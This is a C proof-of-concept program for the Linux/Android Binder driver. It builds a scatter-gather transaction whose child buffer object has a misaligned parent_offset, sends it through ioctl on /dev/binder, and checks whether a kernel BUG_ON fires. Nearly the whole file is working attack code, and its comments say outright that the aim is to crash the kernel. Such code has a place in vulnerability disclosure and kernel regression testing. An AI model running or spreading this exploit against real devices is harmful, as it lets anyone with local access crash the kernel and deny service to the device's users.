#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <bits/ioctl.h>
#include <linux/android/binder.h>

int main(void)
{
    printf("Preparing transaction...\n");

    char interfaceDescriptor[] = "ABC"; // An arbitrary 4-byte aligned interface descriptor CString
    char dummyBuffer[100] = {0};
    uint8_t dataBuffer[sizeof(interfaceDescriptor) + 2 * sizeof(struct binder_buffer_object)] = {0};
    binder_size_t offsetBuffer[2] = {0};

    void* dataPtr = dataBuffer;
    int offsetIndex = 0;

    // Write the interface descriptor
    memcpy(dataBuffer, interfaceDescriptor, sizeof(interfaceDescriptor));
    dataPtr = (uint8_t*)dataPtr + sizeof(interfaceDescriptor);

    // Write the parent object
    struct binder_buffer_object* parentObj = (struct binder_buffer_object*)dataPtr;
    offsetBuffer[offsetIndex++] = (binder_size_t)parentObj - (binder_size_t)dataBuffer;
    dataPtr = (uint8_t*)dataPtr + sizeof(struct binder_buffer_object);
    parentObj->hdr.type = BINDER_TYPE_PTR;
    parentObj->flags = 0;
    parentObj->buffer = (binder_uintptr_t)dummyBuffer;
    parentObj->length = sizeof(dummyBuffer);
    parentObj->parent = 0;
    parentObj->parent_offset = 0;

    // Write the child object with the parent_offset not divisible by 4
    struct binder_buffer_object* childObj = (struct binder_buffer_object*)dataPtr;
    offsetBuffer[offsetIndex++] = (binder_size_t)childObj - (binder_size_t)dataBuffer;
    dataPtr = (uint8_t*)dataPtr + sizeof(struct binder_buffer_object);
    childObj->hdr.type = BINDER_TYPE_PTR;
    childObj->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    childObj->buffer = (binder_uintptr_t)dummyBuffer;
    childObj->length = sizeof(dummyBuffer);
    childObj->parent = 0;
    childObj->parent_offset = 50; // Must be not divisible by sizeof(u32) for the crash to happen

    // Create transaction
    struct binder_transaction_data tx = {
            .flags = TF_ONE_WAY, /* we don't need a reply */
            .data_size = (binder_size_t)((uint8_t*)dataPtr - dataBuffer),
            .offsets_size = offsetIndex * sizeof(binder_size_t)
    };
    tx.data.ptr.buffer = (binder_uintptr_t)dataBuffer;
    tx.data.ptr.offsets = (binder_uintptr_t)offsetBuffer;

    printf("RAW transaction data:");
    for(size_t i = 0; i < tx.data_size; i++)
    	printf(" %02x", ((uint8_t*)tx.data.ptr.buffer)[i]);
    printf("\n");

    // Create sg transaction
    struct binder_transaction_data_sg tx_sg = {
            .transaction_data = tx,
            .buffers_size = sizeof(dummyBuffer)*2 + 8
    };

    // Create the write buffer
    uint8_t write_buffer[sizeof(uint32_t) + sizeof(tx_sg)] = {0};
    *(uint32_t*)write_buffer = BC_TRANSACTION_SG;
    memcpy(write_buffer + sizeof(uint32_t), &tx_sg, sizeof(tx_sg));

    // Create the w/r struct
    struct binder_write_read bwr = {
            .write_size = sizeof(write_buffer) * (1),
            .write_consumed = 0,
            .write_buffer = (binder_uintptr_t)write_buffer,
            .read_size = 0,
            .read_consumed = 0,
            .read_buffer = (binder_uintptr_t)NULL
    };

    // Send the transaction
    printf("Sending transaction...\n");
    fflush(stdout);

    int binder_fd = open("/dev/binder", O_RDWR);
    if(ioctl(binder_fd, BINDER_WRITE_READ, &bwr) != 0)
    {
        fprintf(stderr, "BINDER_WRITE_READ ioctl call failed\n");
        close(binder_fd);
        return 1; // Error code 1
    }

    if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL) != 0)
    {
        fprintf(stderr, "BINDER_THREAD_EXIT ioctl call failed\n");
        close(binder_fd);
        return 2; // Error code 2
    }

    fprintf(stderr, "BUG_ON was not triggered!\n");
    close(binder_fd);
    return 3; // Error code 3
}
